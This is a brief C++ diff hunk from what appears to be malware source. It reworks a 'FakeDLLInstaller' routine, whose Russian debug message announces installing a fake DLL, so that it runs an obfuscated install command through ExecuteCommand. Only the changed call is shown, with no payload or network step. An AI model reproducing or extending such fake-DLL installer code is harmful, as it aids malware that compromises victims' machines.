@@ -860,8 +860,7 @@ void FDI::Install()
 {
 	FKIDBG("FakeDLLInstaller", "Устанавливаем Fake DLL");
 	#ifndef AGENTFULLTEST
-		ExecuteCommand(NULL, GetStr(CommandInstallFakeDLL).t_str(),
-							 GetStr(EStrFakeDllInstallerCommandParams).t_str(), false);
+		ExecuteCommand(NULL, GetStr(EStrCommandInstallFakeDLL).t_str(), NULL , false);
 	#endif
 }
 
